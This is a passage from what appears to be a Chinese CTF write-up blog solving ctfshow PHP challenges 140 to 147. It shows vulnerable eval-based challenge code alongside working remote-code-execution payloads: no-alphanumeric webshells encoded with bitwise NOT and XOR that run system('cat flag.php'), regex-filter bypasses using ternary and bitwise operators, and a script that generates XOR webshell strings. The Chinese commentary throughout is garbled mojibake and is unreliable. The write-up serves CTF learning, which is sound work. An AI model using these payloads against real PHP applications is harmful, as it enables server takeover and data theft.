class="keyword">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-140-intval-å¼±æ¯”è¾ƒ"><a href="#web-140-intval-å¼±æ¯”è¾ƒ" class="headerlink" title="web 140:intval,å¼±æ¯”è¾ƒ"></a>web 140:intval,å¼±æ¯”è¾ƒ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">å¼±æ¯”è¾ƒã€‚</span><br><span class="line">é¦–å…ˆæ˜¯ <span class="number">0</span>==<span class="string">&#x27;å­—ç¬¦ä¸²&#x27;</span> ä¼šè¿”å›<span class="literal">true</span></span><br><span class="line">å…¶æ¬¡æ˜¯ intvalä¼šå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸º<span class="number">0</span></span><br><span class="line">å³intval(<span class="string">&#x27;a&#x27;</span>) = <span class="number">0</span></span><br><span class="line">é‚£ä¹ˆæˆ‘ä»¬å°±æ–¹ä¾¿äº†ã€‚</span><br><span class="line">md5(phpinfo()) = c..xxxx</span><br><span class="line">md5(md5())</span><br><span class="line">ç”šè‡³åˆ©ç”¨æ— å‚rceä¸­çš„.</span><br><span class="line">current(localeconv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-141-phpå‘½ä»¤æ‰§è¡Œç‰¹æ€§ï¼Œæ— å­—æ¯æ•°å­—webshell"><a href="#web-141-phpå‘½ä»¤æ‰§è¡Œç‰¹æ€§ï¼Œæ— å­—æ¯æ•°å­—webshell" class="headerlink" title="web 141:phpå‘½ä»¤æ‰§è¡Œç‰¹æ€§ï¼Œæ— å­—æ¯æ•°å­—webshell"></a>web 141:phpå‘½ä»¤æ‰§è¡Œç‰¹æ€§ï¼Œæ— å­—æ¯æ•°å­—webshell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># error_reporting(0);</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æ— å­—æ¯æ•°å­—çš„RCE</span><br><span class="line">ä¸»è¦ç‰¹å¾å°±æ˜¯è¿™ä¸ªæ­£åˆ™^\W+$ --&gt;åŒ¹é…ä»»æ„éå­—æ¯æ•°å­—</span><br><span class="line">phpå¦ä¸€ä¸ªç‰¹æ€§ï¼šä»£ç å¯ä»¥ä¸æ•°å­—ä¸€èµ·æ‰§è¡Œ</span><br><span class="line">å¦‚<span class="number">1</span>-phpinfo(); ä¼šæ‰§è¡Œï¼Œä½†ä¹Ÿä¼šæŠ¥é”™ã€‚ä½†æ˜¯æŠ¥é”™ä¸ºwarningä¸å½±å“phpinfoçš„æ‰§è¡Œã€‚</span><br><span class="line">é‚£ä¹ˆè¿™é‡Œç”¨å–åæ„é€ webshellã€‚</span><br><span class="line"><span class="comment">//payload:?v1=1&amp;v2=2&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)-</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-142-phpç§‘å­¦è®¡æ•°æ³•"><a href="#web-142-phpç§‘å­¦è®¡æ•°æ³•" class="headerlink" title="web 142:phpç§‘å­¦è®¡æ•°æ³•"></a>web 142:phpç§‘å­¦è®¡æ•°æ³•</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æ ¹æ®é¢˜ç›®ã€‚è¾“å…¥çš„åªèƒ½æ˜¯æ•°å­—,å¦‚æœè¾“å…¥æ­£æ•°ä¼šç›´æ¥sleepNä¹…ã€‚</span><br><span class="line">å› ä¸ºç§‘å­¦è®¡æ•°æ³•ä¹Ÿæ˜¯æ•°å­—ã€‚</span><br><span class="line"><span class="comment">//payload:?v1=0e123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-143-æ— å­—æ¯æ•°å­—webshell"><a href="#web-143-æ— å­—æ¯æ•°å­—webshell" class="headerlink" title="web 143:æ— å­—æ¯æ•°å­—webshell"></a>web 143:æ— å­—æ¯æ•°å­—webshell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">çœ‹äº†ä¸‹é¢˜ã€‚åº”è¯¥æ˜¯æ— å­—æ¯æ•°å­—æ„é€ webshell</span><br><span class="line">æ²¡äº†+-æˆ‘ä»¬å¯ä»¥ç”¨*å¸¦ä»£æ›¿</span><br><span class="line"><span class="comment">//payload1:?v1=1&amp;v2=2&amp;v3=*((%ff%ff%ff%ff%ff%ff)^(%8c%86%8c%8b%9a%92))((&#x27;%0c%13&#x27;)^(&#x27;``&#x27;))*</span></span><br><span class="line">å¾—åˆ°å½“å‰ç›®å½•ä¸‹æœ‰ï¼šflag.php index.php</span><br><span class="line"><span class="comment">//payload2:?v1=1&amp;v2=2&amp;v3=*((%ff%ff%ff%ff%ff%ff)^(%8c%86%8c%8b%9a%92))((&#x27;%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff&#x27;)^(&#x27;%9c%9e%8b%df%99%93%9e%98%d1%8f%97%8f&#x27;))*</span></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¡ºä¾¿è´´ä¸€ä¸ªå¼‚æˆ–webshellçš„è„šæœ¬(æœ‰æ— å•å¼•å·å‡å¯)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$l</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$argv</span> = str_split(<span class="string">&quot;cat flag.php&quot;</span>);<span class="comment">//å‡†å¤‡å¾—åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$argv</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">255</span>;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = chr(<span class="variable">$j</span>)^chr(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$k</span> == <span class="variable">$argv</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">                <span class="variable">$r</span> .= <span class="string">&quot;%0&quot;</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$l</span> .= <span class="string">&quot;%ff&quot;</span>;</span><br><span class="line">            <span class="variable">$r</span> .= <span class="string">&quot;%&quot;</span> . dechex(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;(&#x27;<span class="subst">$l</span>&#x27;)^(&#x27;<span class="subst">$r</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-144-web-143å¼±åŒ–ç‰ˆ"><a href="#web-144-web-143å¼±åŒ–ç‰ˆ" class="headerlink" title="web 144:# web 143å¼±åŒ–ç‰ˆ"></a>web 144:# web 143å¼±åŒ–ç‰ˆ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; check(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">è¿˜æ˜¯ä¸€æ ·çš„æ— å­—æ¯æ•°å­—æ„é€ ã€‚</span><br><span class="line">ä¸€æŠŠæ¢­å“ˆã€‚ä¸è¿‡è¿™æ¬¡æ˜¯v3=-</span><br><span class="line"><span class="comment">//payload:?v1=1&amp;v2=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)&amp;v3=-</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-145-ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå˜é‡æ‹¼æ¥RCE"><a href="#web-145-ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå˜é‡æ‹¼æ¥RCE" class="headerlink" title="web 145:ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå˜é‡æ‹¼æ¥RCE"></a>web 145:ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå˜é‡æ‹¼æ¥RCE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\# |\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">è¿˜æ˜¯ä¸€æ ·çš„æ— å­—æ¯æ•°å­—æ„é€ ã€‚</span><br><span class="line">ä½†æ˜¯ï¼è¿™é‡Œæˆ‘ä»¬çš„-+*/å…¨è¢«banäº†ã€‚è¿™é‡Œè‚¯å®šæœ‰æ–°çš„çŸ¥è¯†ç‚¹ï¼Œä½†æ˜¯æˆ‘ä¸ä¼šã€‚</span><br><span class="line">çœ‹äº†ç¾½å¸ˆå‚…WPã€‚</span><br><span class="line">è¿™é‡Œè€ƒå¯Ÿä¸‰ç›®è¿ç®—ç¬¦ã€‚</span><br><span class="line">å¦‚<span class="meta">&lt;?php</span> <span class="keyword">return</span> <span class="number">1</span>?phpinfo():<span class="number">1</span>;<span class="meta">?&gt;</span></span><br><span class="line">è¿™é‡Œä¼šæ‰§è¡Œphpinfo();</span><br><span class="line">æ€è·¯æœ‰äº†ã€‚å†²ï¼</span><br><span class="line"><span class="comment">//payload:?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F):</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-146-phpä»£ç å¯ä»¥ä¸ä½è¿ç®—åŒæ—¶æ‰§è¡Œ"><a href="#web-146-phpä»£ç å¯ä»¥ä¸ä½è¿ç®—åŒæ—¶æ‰§è¡Œ" class="headerlink" title="web 146:phpä»£ç å¯ä»¥ä¸ä½è¿ç®—åŒæ—¶æ‰§è¡Œ"></a>web 146:phpä»£ç å¯ä»¥ä¸ä½è¿ç®—åŒæ—¶æ‰§è¡Œ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\# |\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">è¿˜æ˜¯ä¸€æ ·çš„æ— å­—æ¯æ•°å­—æ„é€ ã€‚</span><br><span class="line">ä½†æ˜¯ï¼è¿™é‡Œæˆ‘ä»¬çš„-+*/:å…¨è¢«banäº†ã€‚ä¸‰æœ¨è¿ç®—ç¬¦è¡Œä¸é€šäº†ã€‚</span><br><span class="line">æ—¢ç„¶æ™®é€šçš„ç®—å¼å¯ä»¥è¿ç®—ï¼Œé‚£ä¹ˆä½è¿ç®—å‘¢ï¼Ÿæœ¬åœ°æµ‹è¯•ä¸‹ã€‚</span><br><span class="line"><span class="keyword">eval</span>(<span class="number">1</span>|phpinfo());</span><br><span class="line">è¿™é‡Œä¼šæ‰§è¡Œphpinfo();</span><br><span class="line">æ€è·¯æœ‰äº†ã€‚å†²ï¼</span><br><span class="line"><span class="comment">//payload:?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)|</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-147-create-function-fuzzæµ‹è¯•ç»•è¿‡æ­£åˆ™"><a href="#web-147-create-function-fuzzæµ‹è¯•ç»•è¿‡æ­£åˆ™" class="headerlink" title="web 147:create_function,fuzzæµ‹è¯•ç»•è¿‡æ­£åˆ™"></a>web 147:create_function,fuzzæµ‹è¯•ç»•è¿‡æ­£åˆ™</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"> 